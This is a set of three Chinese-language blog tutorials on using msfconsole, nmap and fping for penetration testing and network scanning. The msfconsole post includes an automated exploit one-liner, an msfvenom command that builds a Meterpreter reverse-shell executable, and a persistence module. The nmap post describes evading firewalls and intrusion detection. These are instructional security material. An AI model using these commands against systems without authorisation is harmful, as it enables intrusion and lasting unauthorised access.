[{"content":"一、简介 msfconsole 是 Metasploit Framework 的命令行界面，用于执行各种安全测试和渗透测试任务。Metasploit 是一个功能强大的渗透测试工具，提供了丰富的漏洞利用模块、后渗透工具和自动化功能。\n二、安装 Kali Linux（Metasploit 已预装）：\n1 2 sudo apt update sudo apt install metasploit-framework 其他 Linux 发行版： 可以通过 Rapid7 官方网站 获取安装指南。\n三、基本语法 1 msfconsole 四、常用命令 （一）启动 msfconsole 1 msfconsole （二）查找模块 1 search \u0026lt;keyword\u0026gt; 例如：\n1 search apache （三）使用模块 1 use \u0026lt;module\u0026gt; 例如：\n1 use exploit/unix/webapp/apache_mod_cgi （四）设置模块选项 1 set \u0026lt;option\u0026gt; \u0026lt;value\u0026gt; 例如：\n1 2 set RHOSTS 192.168.1.100 set RPORT 80 （五）查看模块选项 1 show options （六）运行模块 1 run （七）退出 msfconsole 1 exit 五、高级用法 （一）自动化攻击 使用 msfconsole 的自动化功能可以快速执行攻击任务。例如：\n1 msfconsole -q -x \u0026#34;use exploit/unix/webapp/apache_mod_cgi; set RHOSTS 192.168.1.100; set RPORT 80; run\u0026#34; （二）生成 Meterpreter 有效载荷 1 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe （三）使用 Meterpreter 会话 1 2 sessions -l sessions -i \u0026lt;session_id\u0026gt; （四）后渗透攻击 1 2 search post use post/windows/manage/persistence （五）利用漏洞 1 2 3 4 5 search exploit use exploit/unix/webapp/apache_mod_cgi set RHOSTS 192.168.1.100 set RPORT 80 run （六）端口扫描 查看端口扫描模块：\n1 search portscan 使用端口扫描模块：\n1 use auxiliary/scanner/portscan/top 查看模块选项：\n1 show options 设置目标 IP：\n1 set RHOSTS 192.168.1.100 设置线程数：\n1 set THREADS 100 执行扫描：\n1 run （七）服务扫描 查看服务扫描模块：\n1 search smb_version 使用服务扫描模块：\n1 use auxiliary/scanner/smb/smb_version 查看模块选项：\n1 show options 设置目标 IP：\n1 set RHOSTS 192.168.1.100 设置线程数：\n1 set THREADS 10 执行扫描：\n1 run 六、注意事项 权限问题：某些功能（如监听低端口号）可能需要管理员权限。 网络环境：某些网络环境可能限制某些模块的使用。 法律问题：未经授权的渗透测试行为可能违反法律法规。 七、总结 msfconsole 是一个功能强大的渗透测试工具，适用于多种安全测试场景，包括漏洞利用、后渗透攻击和自动化攻击。通过掌握基本语法和高级用法，可以快速定位网络中的漏洞并进行安全审计。\n","date":"2025-04-20T23:10:14+08:00","permalink":"https://souljian.cn/p/745161814/","title":"Msfconsole命令使用"},{"content":"一、简介 nmap 是一款开源的网络探测和安全审核工具，可以用来扫描网络主机，确定哪些主机在运行、运行哪些服务以及运行哪个操作系统等信息。它支持多种扫描技术，能够识别网络上的活跃设备、开放端口、运行服务和操作系统类型。\n二、安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install nmap CentOS/RHEL：\n1 sudo yum install nmap Arch Linux：\n1 sudo pacman -S nmap 三、基本语法 1 nmap [选项] [目标] 四、常用选项 （一）扫描类型 -sS：TCP SYN 扫描（半开放扫描）。 -sT：TCP 连接扫描。 -sU：UDP 扫描。 -sP：仅进行主机发现。 -sV：服务版本检测。 -O：操作系统检测。 （二）端口指定 -p \u0026lt;端口\u0026gt;：指定扫描的端口范围。\n1 nmap -p 80,443 target_ip -p-：扫描所有 65535 个端口。\n1 nmap -p- target_ip （三）输出选项 -oN \u0026lt;文件\u0026gt;：将扫描结果保存到普通文本文件。\n1 nmap -oN scan_results.txt target_ip -oX \u0026lt;文件\u0026gt;：将扫描结果保存为 XML 格式。\n1 nmap -oX scan_results.xml target_ip -oG \u0026lt;文件\u0026gt;：将扫描结果保存为 Grepable 格式。\n1 nmap -oG scan_results.gnmap target_ip （四）其他选项 -v：详细模式，显示更多信息。\n1 nmap -v target_ip -A：启用操作系统和服务版本检测。\n1 nmap -A target_ip -T \u0026lt;级别\u0026gt;：设置扫描速度（0 最慢，5 最快）。\n1 nmap -T4 target_ip -Pn：跳过主机发现，直接扫描指定主机。\n1 nmap -Pn target_ip 五、高级功能与选项 （一）服务版本检测 使用 -sV 选项可以检测目标主机开放端口上运行的服务及其版本信息。这对于漏洞扫描和服务识别非常有用：\n1 nmap -sV target_ip （二）操作系统检测 nmap 可以通过分析网络堆栈，尝试识别目标主机的操作系统类型和版本：\n1 nmap -O target_ip （三）脚本扫描 nmap 的脚本引擎（NSE）支持数百个脚本，涵盖从服务检测到漏洞扫描、恶意软件检测、Brute-force 攻击等多种用途。例如，使用漏洞扫描脚本集：\n1 nmap --script vuln target_ip （四）扫描速度控制 在高流量或防火墙严格的网络环境中，可以通过 -T 选项调整扫描速度（0为最慢，5为最快）。例如，快速扫描：\n1 nmap -T4 target_ip （五）防火墙规避 nmap 提供了一些技术来规避防火墙和入侵检测系统（IDS），例如使用碎片化数据包（-f）、修改扫描速率（-T0 至 -T5）。\n（六）并发扫描与负载优化 nmap 支持并发扫描和负载优化，以提高扫描效率。例如，禁用主机发现（-Pn）和 DNS 解析（-n）：\n1 nmap -Pn -n target_ip （七）自定义数据包发送 高级用户可以利用 nmap 构建和发送自定义数据包，例如通过 --data-length、--data-string 等参数。\n（八）网络拓扑发现与可视化 nmap 可以结合 traceroute 绘制网络拓扑图，展示网络设备之间的连接关系。\n（九）漏洞扫描与安全审计 借助 NSE 脚本，nmap 可以进行各种漏洞扫描，包括已知漏洞的检测和配置错误的识别。\n（十）结果输出与报告生成 nmap 支持多种结果输出格式，如标准输出、XML 格式（-oX）、Grepable 格式（-oG）。\n六、使用示例 （一）基本扫描 扫描单个主机：\n1 nmap 192.168.1.100 扫描多个主机：\n1 nmap 192.168.1.1-10 扫描特定端口：\n1 nmap -p 80,443 192.168.1.100 （二）高级扫描 服务版本检测：\n1 nmap -sV 192.168.1.100 操作系统检测：\n1 nmap -O 192.168.1.100 快速扫描：\n1 nmap -F 192.168.1.100 扫描网络中的所有主机：\n1 nmap -sP 192.168.1.0/24 （三）脚本扫描 使用 NSE 脚本进行漏洞扫描：\n1 nmap --script vuln 192.168.1.100 使用特定脚本：\n1 nmap --script http-title 192.168.1.100 （四）防火墙规避 使用碎片化数据包：\n1 nmap -f 192.168.1.100 调整扫描速度：\n1 nmap -T0 192.168.1.100 （五）并发扫描与负载优化 禁用主机发现和 DNS 解析：\n1 nmap -Pn -n 192.168.1.100 七、注意事项 权限问题：某些扫描类型（如 -sS）需要管理员权限才能运行。 网络环境：某些网络环境可能限制 ICMP 请求或特定端口的扫描。 扫描速度：在高流量或防火墙严格的网络环境中，需要调整扫描速度以避免被检测到。 结果输出：使用 -oN、-oX、-oG 等选项保存扫描结果，便于后续分析。 八、总结 nmap 是一个功能强大的网络扫描工具，适用于多种场景，包括网络发现、端口扫描、服务检测、操作系统识别和漏洞扫描。通过掌握基本语法和高级功能，可以快速定位网络中的设备和服务，帮助进行网络管理和安全审计。\n","date":"2025-04-20T22:59:14+08:00","permalink":"https://souljian.cn/p/745161154/","title":"Nmap命令使用"},{"content":" 一、简介 fping 是一个用于发送 ICMP Echo 请求的工具，类似于 ping，但它可以同时对多个主机进行 ICMP Echo 请求，并且输出结果更加简洁。它特别适合用于批量检测主机的存活性。\n二、安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install fping CentOS/RHEL：\n1 sudo yum install fping Arch Linux：\n1 sudo pacman -S fping 三、基本语法 1 fping [选项] [主机列表] 四、常用选项 -a：仅显示存活的主机。 -b：设置 ping 数据包的大小（默认为 56 字节）。 -c：设置每个目标的 ping 次数（默认为 1）。 -f：从文件获取目标列表（不能与 -g 同时使用）。 -g：通过指定起始和结束地址来生成目标列表，可以是网段。 -l：循环发送 ping。 -u：显示不可到达的目标。 -s：显示统计信息，包括发送和接收的 ICMP Echo 请求数量。 五、使用示例 （一）基本用法 ping 单个主机：\n1 fping 192.168.1.100 发送 ICMP Echo 请求到 192.168.1.100。\nping 多个主机：\n1 fping 192.168.1.1 192.168.1.2 192.168.1.3 同时对多个主机发送 ICMP Echo 请求。\nping 网段中的所有主机：\n1 fping -g 192.168.1.0/24 生成并扫描 192.168.1.0/24 网段中的所有主机。\n仅显示存活的主机：\n1 fping -a 192.168.1.1 192.168.1.2 192.168.1.3 仅显示响应 ICMP Echo 请求的主机。\n（二）高级用法 显示统计信息：\n1 fping -s 192.168.1.1 192.168.1.2 192.168.1.3 发送 ICMP Echo 请求并显示统计信息，包括发送和接收的 ICMP Echo 请求数量。\n指定发送次数和间隔：\n1 fping -c 3 -i 100 192.168.1.100 对 192.168.1.100 发送 3 次 ICMP Echo 请求，每次请求间隔 100 毫秒。\n从文件中读取主机列表：\n1 fping -f hosts.txt 从文件 hosts.txt 中读取主机列表并进行 ICMP Echo 请求。\n显示存活的主机并统计：\n1 fping -a -s 192.168.1.0/24 扫描 192.168.1.0/24 网段中的所有主机，仅显示存活的主机并显示统计信息。\n六、注意事项 权限问题：fping 需要管理员权限才能发送 ICMP 请求。 网络环境：某些网络环境可能限制 ICMP 请求，导致 fping 无法正常工作。 输出格式：fping 的输出格式较为简洁，适合批量检测主机存活性。 七、总结 fping 是一个功能强大的工具，特别适合用于批量检测主机的存活性。通过掌握基本语法和常用选项，可以快速定位网络中的存活主机。结合 -s 参数，可以获取更详细的统计信息，帮助分析网络状态。\n","date":"2025-04-20T20:49:53+08:00","permalink":"https://souljian.cn/p/745153393/","title":"Fping命令使用"}]